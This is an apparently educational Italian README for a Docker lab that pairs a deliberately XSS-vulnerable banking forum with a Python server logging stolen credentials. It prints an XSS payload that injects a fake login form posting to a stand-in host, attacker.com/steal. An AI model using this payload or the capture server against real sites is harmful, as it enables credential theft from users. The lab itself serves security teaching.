# Progetto di Sicurezza Informatica: Vulnerabilità XSS e Sniffing

[![Security](https://img.shields.io/badge/domain-Cybersecurity-red)]()
[![Web Security](https://img.shields.io/badge/focus-Web%20Security-orange)]()
[![Penetration Testing](https://img.shields.io/badge/approach-Penetration%20Testing-yellow)]()
[![OWASP](https://img.shields.io/badge/standard-OWASP%20Top%2010-blue)](https://owasp.org/www-project-top-ten/)
[![PHP](https://img.shields.io/badge/PHP-8.0+-777BB4?logo=php)]()
[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?logo=python)]()
[![MySQL](https://img.shields.io/badge/MySQL-8.0-4479A1?logo=mysql)]()
[![Docker](https://img.shields.io/badge/Docker-20.10+-2496ED?logo=docker)]()

## Descrizione del Progetto

Questo progetto dimostra due vulnerabilità comuni nello sviluppo web:
1. **Cross-Site Scripting (XSS)**: Un attacco che permette l'esecuzione di codice JavaScript malevolo nel contesto di un'applicazione web
2. **Sniffing di credenziali**: Un attacco che intercetta e registra dati sensibili inviati tramite form

Il progetto simula un forum bancario vulnerabile a XSS, con un server aggiuntivo che cattura le credenziali inviate tramite un form compromesso.

## Componenti

1. **Servizio Web (Apache/PHP)**
   - Forum bancario vulnerabile a XSS
   - Connessione a database MySQL
   - Nessuna sanificazione degli input/output

2. **Database MySQL**
   - Contiene una tabella `comments` per memorizzare i post del forum

3. **Server di Sniffing (Python)**
   - In ascolto sulla porta 5000
   - Cattura e registra le credenziali inviate via POST
  
## Autori
- Carlo Da Roma
- [Piolo Llanos](https://github.com/pioloLlanos)

## Vulnerabilità Implementate

### 1. Cross-Site Scripting (XSS)
- **Posizione**: Input del commento e visualizzazione nel forum
- **Esempio di payload**:
  ```html
  <script>alert('XSS Attack!')</script>
  ```
  ```html
  <script>
    document.write('<form action="http://attacker.com/steal" method="post">' +
                   '<input type="text" name="username" placeholder="Username">' +
                   '<input type="password" name="password" placeholder="Password">' +
                   '<input type="submit" value="Submit"></form>');
  </script>
  ```

### 2. Sniffing di Credenziali
- Il server Python (`app.py`) registra tutte le coppie username/password inviate via POST
- I dati vengono salvati in `sniffed.txt`
- Per non far riuscire il pop up ad utenti che hanno già eseguito il login abbiamo deciso di salvare delle variabili interne al browser.

## Configurazione e Avvio

1. **Prerequisiti**:
   - Docker e Docker Compose installati

2. **Avvio dei servizi**:
   ```bash
   docker-compose up --build
   docker-compose ps
   ```

3. **Accesso all'applicazione**:
   - Forum bancario: http://localhost
   - Server di sniffing: http://localhost:5000 (solo per invio dati)

4. **Ripristino**:
   ```bash
   sudo docker-compose down -v
   ```
---

<sub><i>last update 06/06/2025</i></sub>
